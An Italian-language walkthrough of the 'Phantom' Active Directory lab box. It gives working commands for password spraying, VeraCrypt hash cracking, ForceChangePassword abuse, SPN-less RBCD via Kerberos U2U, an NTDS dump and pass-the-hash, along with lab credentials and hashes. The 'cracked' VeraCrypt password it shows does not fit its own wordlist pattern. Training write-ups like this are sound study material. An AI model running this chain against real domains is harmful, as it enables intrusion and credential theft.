+++
date = '2026-10-27T20:04:34+01:00'
draft = false
title = 'Phantom Writeup IT'
+++
**Autore**: **`joy.scd01`**

**Data**: **`27/10/2026`**

![pwn.png](/images/imgs_phantom/pwn.png)

---

# Introduzione

**_Phantom_** è un ambiente **Active Directory** di **VulnLab** classificato come livello **Medium** che tratta argomenti come la generazione di wordlist personalizzate e l'abuso avanzato delle deleghe in **Active Directory**.

L'exploitation path inizia con un accesso **SMB** anonimo, che porta alla scoperta di credenziali leakate e di una lista di utenti tramite **RID bruteforcing**. Dopo aver ottenuto l'accesso a una share limitata, viene scoperto un volume **VeraCrypt**. La difficoltà si sposta sull'estrazione dell'hash e sulla **generazione di una wordlist personalizzata** basata sulle regole di mutazione aziendali per poterlo craccare.
Il Lateral Movement prevede l'abuso del privilegio **`ForceChangePassword`** su un account utente, che a sua volta possiede i permessi **`AllowedToAct`** sul **Domain Controller**. La Privilege Escalation finale richiede l'esecuzione di un raro attacco **SPN-less Resource-Based Constrained Delegation** (**RBCD**) utilizzando la tecnica **User-to-User** (**U2U**) per dumpare l'**NTDS** e ottenere la compromissione totale.

---

# Tecniche Utilizzate

- **Anonymous SMB Enumeration**

- **Password Spraying**

- **RID Bruteforcing**

- **VeraCrypt Volume Hash Extraction & Cracking**

- **Custom Wordlist Generation (crunch)**

- **BloodHound AD Analysis**

- **ForceChangePassword Abuse**

- **SPN-less Resource-Based Constrained Delegation (RBCD)** 

- **Pass-The-Hash**

- **NTDS Dump**

---
# Enumerazione

## nmap

Scansione iniziale su tutte le porte:

```bash
nmap -p- phantom -Pn
```

```text
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
```

Scansione mirata con script e rilevamento dei servizi:

```bash
nmap -sC -sV phantom -Pn
```

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-26 10:27:46Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: phantom.vl, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: phantom.vl, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: PHANTOM
|   NetBIOS_Domain_Name: PHANTOM
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: phantom.vl
|   DNS_Computer_Name: DC.phantom.vl
|   Product_Version: 10.0.20348
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

La scansione rivela una configurazione standard da **Domain Controller Active Directory** con **Windows Server 2022** (Build **`10.0.20348`**). Il nome a dominio è **`phantom.vl`**, che ho immediatamente aggiunto al mio file **`/etc/hosts`**, insieme a **`dc.phantom.vl`**.

## Enumerazione SMB anonima

Ho iniziato enumerando le share **SMB** in modo anonimo tramite **NetExec**:

```bash
nxc smb phantom.vl -u 'Guest' -p '' --shares
```

![smb.png](/images/imgs_phantom/smb.png)

La share **`Public`** era leggibile dall'account **guest**. Mi ci sono connesso usando **smbclient** e ho scaricato tutto il contenuto:

```bash
smbclient \\\\phantom.vl\\Public -U 'guest'
mget *
```

![smb1.png](/images/imgs_phantom/smb1.png)

Ho trovato un file **`.eml`**.

**Nota**: _Questo è un formato in plain text utilizzato dai client di posta (come **Microsoft Outlook** o **Mozilla Thunderbird**) per memorizzare gli header dell'email, il corpo e gli eventuali allegati codificati in formato **MIME**._

Dopo aver cercato online un visualizzatore per file **`.eml`**, ho letto l'allegato e leakava una password: **`Ph4nt0m@5t4rt!`**.

![pdfpass.png](/images/imgs_phantom/pdfpass.png)

---

# Accesso Iniziale | RID Bruteforcing & Password Spraying

Prima di provare questa password alla cieca, avevo bisogno di una lista di utenti validi. Ho eseguito un attacco di **RID bruteforce**  per estrarre gli username:

```bash
nxc smb phantom.vl -u 'a' -p '' --shares --rid-brute | tee users.txt
```

Per formattare l'output in una userlist pulita, si può utilizzare questo one-liner in **bash**:

```bash
cat users.txt | cut -d '\' -f2 | awk '{print $1}' | tee users_clean.txt
```

**Nota**: _L'output del **RID bruteforce** di solito formatta gli utenti come **`DOMINIO\username (status)`**. Passandolo in pipe a **`cut -d '\' -f2`**, usiamo il backslash come delimitatore per rimuovere il nome del dominio. Successivamente, **`awk '{print $1}'`** isola la prima parola della stringa rimanente, eliminando di fatto tutti gli spazi, le descrizioni o i codici di stato finali. Infine, **`tee`** salva gli username puliti in un nuovo file mostrandoli contemporaneamente a schermo._

```text
Administrator
Guest
krbtgt
svc_sspr
rnichols
pharrison
wsilva
elynch
nhamilton
lstanley
bbarnes
cjones
agarcia
ppayne
ibryant
ssteward
wstewart
vhoward
crose
twright
fhanson
cferguson
alucas
ebryant
vlynch
ghall
ssimpson
ccooper
vcunningham
```

Dopo aver revisionato manualmente l'output e ripulito la lista da eventuali **gruppi di default** o **account non utente**, ho usato la password appena scoperta per eseguire un **password spraying**:

```bash
nxc smb phantom.vl -u users_clean.txt -p 'Ph4nt0m@5t4rt!' --continue-on-success
```

![spray.png](/images/imgs_phantom/spray.png)

Hit sull'utente **`ibryant`**.

---
# Lateral Movement | VeraCrypt & Custom Wordlists

Ho controllato di nuovo le **share SMB**, questa volta autenticato come **`ibryant`**:

```bash
nxc smb phantom.vl -u ibryant -p 'Ph4nt0m@5t4rt!' --shares
```

![smb2.png](/images/imgs_phantom/smb2.png)

L'utente aveva accesso ad una nuova share chiamata **`Departments Share`**. Mi ci sono connesso e ho navigato tra le directory:

```bash
smbclient //10.10.111.88/'Departments Share' -U phantom.vl/'ibryant%Ph4nt0m@5t4rt!'
cd IT\Backup
mget *
```

![smbackup.png](/images/imgs_phantom/smbackup.png)

Ho scaricato un file interessante chiamato **`IT_BACKUP_201123.hc`**. L'estensione **`.hc`** appartiene a **VeraCrypt** (un software open-source per la crittografia dei dischi).

Il volume **VeraCrypt** richiedeva una password, quindi dovevo prima estrarne l'hash.

![required.png](/images/imgs_phantom/required.png)

Ho usato **`dd`** per estrarre i primi **512 byte** del volume, che contengono l'**header crittografato** e il **salt**:

```bash
dd if=IT_BACKUP_201123.hc of=hc.hash bs=512 count=1
```

**Nota**: _**VeraCrypt** utilizza **PBKDF2** per la derivazione della chiave. Estraendo i primi **512 byte**, possiamo passarli ad **Hashcat** (modalità **`13722`**) per eseguire attacchi a dizionario offline._

![hashcat.png](/images/imgs_phantom/hashcat.png)

Ho provato diverse wordlist standard, ma senza successo. Facendo un passo indietro, ho optato per un classico scenario da penetration testing reale: gli utenti creano spesso password basate sul nome dell'azienda, l'anno corrente e un carattere speciale. **Fun fact**: quando ho pwnato originariamente questa macchina su **VulnLab**, ho dovuto intuire questo pattern da solo, poiché non c'era alcun hint. Ora che la box è stata portata su **HackTheBox**, questa esatta logica è stata inserita come hint esplicito nelle **Machine Information**.

Per sfruttare questa dinamica, ho usato **crunch** per generare una wordlist personalizzata applicando regole di mutazione di base alla parola "**Phantom**":

```bash
crunch 12 12 -t 'Phantom202%^' -o wordlist.txt
```

**Nota**: _In **crunch**, la flag **`-t`** definisce un pattern. In questo caso, **`%`** inserisce numeri (**0-9**) e **`^`** inserisce i caratteri speciali. Questo genera password come **`Phantom2020!`**, **`Phantom2023@`**, ecc., che rispecchiano perfettamente le comuni policy aziendali sulle password._

Ho dato la wordlist in pasto ad **Hashcat**:

```bash
hashcat -a 0 -m 13722 hc.hash wordlist.txt
```

Cracked: **`gB6XTcqVP5MlP7Rc`**.

![crack.png](/images/imgs_phantom/crack.png)

Ho scaricato **VeraCrypt**, montato il file **`.hc`** usando la password appena trovata, e ispezionato il contenuto.

![mount.png](/images/imgs_phantom/mount.png)

All'interno, era presente una cartella **`vyos_backup`** contenente un file **`config.boot`** che ha rivelato un altro set di credenziali.

![clearpass.png](/images/imgs_phantom/clearpass.png)

**Password Spray**:

```bash
nxc smb phantom.vl -u users_clean.txt -p 'gB6XTcqVP5MlP7Rc' --continue-on-success
```

![spray2.png](/images/imgs_phantom/spray2.png)

Le credenziali erano valide per **`svc_sspr`**, ma l'accesso **WinRM** era limitato.

---
# Privilege Escalation | ForceChangePassword Abuse & SPN-less RBCD Attack

Non avendo accesso diretto, ho deciso di mappare l'**Active Directory** utilizzando **BloodHound**. Ho avviato il **Python ingestor** utilizzando le credenziali del mio foothold iniziale:

```bash
bloodhound-python -u 'ibryant' -p 'Ph4nt0m@5t4rt!' -ns 10.10.111.88 -d phantom.vl -c all --zip
```

![harvers.png](/images/imgs_phantom/harvers.png)

Caricando i dati nella **BloodHound GUI**, ho analizzato l'**Outbound Object Control** per **`svc_sspr`**.

![forcechange.png](/images/imgs_phantom/forcechange.png)

**`svc_sspr`** possedeva i diritti di **`ForceChangePassword`** su tre utenti: **`rnichols`**, **`wsilva`** e **`crose`**.

Controllando gli archi in uscita per questi tre utenti, ho trovato qualcosa di interessante: tutti possedevano permessi **`AllowedToAct`** sul **Domain Controller**.

![act.png](/images/imgs_phantom/act.png)

Per prima cosa, ho sfruttato il privilegio **`ForceChangePassword`** per sovrascrivere la password di **`rnichols`**:

![abuse.png](/images/imgs_phantom/abuse.png)

```bash
pth-net rpc password rnichols "stars1%" -U phantom.vl/svc_sspr%gB6XTcqVP5MlP7Rc -S phantom.vl
```

Ora controllavo l'account **`rnichols`** che aveva diritti di **Resource-Based Constrained Delegation** (**RBCD**) sul **DC**. C'era però un ostacolo: **`rnichols`** è un **Account Utente**, non un **Account Macchina**.

![abuse2.png](/images/imgs_phantom/abuse2.png)

**Nota**: In un normale attacco **RBCD**, si compromette un account con **`AllowedToActOnBehalfOfOtherIdentity`** su un sistema target. Si crea quindi un finto **Account Macchina** (che possiede intrinsecamente un **SPN - Service Principal Name**), gli si concede la delega e si richiede un **Service Ticket** utilizzando **S4U2Self**/**S4U2Proxy**. Ma poiché rnichols è un normale utente privo di **SPN**, l'estensione standard **S4U2Proxy** fallisce. Per aggirare il problema, ho utilizzato un attacco **SPN-less RBCD** tramite l'estensione **Kerberos User-to-User** (**U2U**).

![quota.png](/images/imgs_phantom/quota.png)

Per eseguire l'attacco **SPN-less RBCD**, ho configurato un virtual environment in **Python** e ho installato **Impacket**:

```bash
python3 -m venv venv && . venv/bin/activate
pip3 install impacket
```

Ho utilizzato **impacket-rbcd** per configurare la delega:

```bash
impacket-rbcd -delegate-from 'rnichols' -delegate-to 'DC$' -dc-ip '10.10.111.88' -action 'write' 'phantom.vl'/'rnichols':'stars1%'
```

![priv1.png](/images/imgs_phantom/priv1.png)

Ho richiesto un **TGT** per **`rnichols`** ed estratto la **Ticket Session Key**:

```bash
impacket-getTGT -hashes :$(pypykatz crypto nt 'stars1%') 'phantom.vl'/'rnichols'
export KRB5CCNAME=rnichols.ccache
impacket-describeTicket 'rnichols.ccache' | grep 'Ticket Session Key'
```

![priv2.png](/images/imgs_phantom/priv2.png)

```bash
impacket-changepasswd -newhashes :0b13e9062cd35e8b5c8a01d0b33e379f 'phantom.vl'/'rnichols':'stars0@'@'phantom.vl'
```

![priv3.png](/images/imgs_phantom/priv3.png)

e ho applicato il trick **U2U** per impersonare il **Domain Administrator**:

```bash
impacket-getST -k -no-pass -u2u -impersonate "Administrator" -spn "cifs/dc.phantom.vl" 'phantom.vl'/'rnichols'
```

![priv4.png](/images/imgs_phantom/priv4.png)

Questo mi ha garantito un **Service Ticket** per l'account **Administrator**. Ho esportato il nuovo file **ccache** e ho usato **NetExec** con il **ticket Kerberos** per effettuare il **dump dell'NTDS**:

```bash
export KRB5CCNAME=Administrator@cifs_dc.phantom.vl@PHANTOM.VL.ccache
nxc smb dc.phantom.vl --use-kcache -M ntdsutil
```

![priv5.png](/images/imgs_phantom/priv5.png)

Ho ottenuto una shell **System** eseguendo un **Pass-The-Hash** con **psexec**:

```bash
psexec.py -hashes :aa2abd9db4f5984e657f834484512117 Administrator@phantom.vl
```

![rootf.png](/images/imgs_phantom/rootf.png)

![userf.png](/images/imgs_phantom/userf.png)

---

# Considerazioni Finali

**_Phantom_** è un'**Active Directory** geniale. Il foothold iniziale simula misconfigurazioni aziendali realistiche, costringendo a ragionare come un vero dipendente nella creazione della wordlist per le password.
La parte più interessante è innegabilmente la fase di Privilege Escalation. Costringere l'attaccante a pivotare tramite **ForceChangePassword** per raggiungere un account con privilegi **AllowedToAct**, e richiedere successivamente un attacco **SPN-less RBCD** tramite autenticazione **User-to-User**, rappresenta una rara opportunità di apprendimento. Un box caldamente consigliato per padroneggiare l'abuso avanzato di **Kerberos**.

